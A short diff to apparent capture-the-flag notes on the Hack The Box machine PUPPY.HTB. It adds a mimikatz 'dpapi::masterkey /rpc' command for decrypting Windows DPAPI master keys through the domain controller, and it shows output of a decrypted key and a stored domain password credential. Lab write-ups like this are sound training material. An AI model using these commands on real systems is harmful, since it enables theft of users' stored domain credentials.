@@ -1,4 +1,5 @@
-
+- if you have interactive session `query user` on the box, you can get the the key by asking the DC, this is valid because your user credentials are cached, you can use mimikatz 
+  `dpapi::masterkey /in:<PATH TO key> /rpc` the `/rpc` is the big win, because it talks to DC to decrypt the key for us.
 Copy 2 file, one is the master key And the other is where other passwords is stored.
 
 
@@ -23,7 +24,7 @@ Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3
 [CREDENTIAL]
 LastWritten : 2025-03-08 15:54:29
 Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
-Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+	Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
 Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
 Target      : Domain:target=PUPPY.HTB
 Description : 
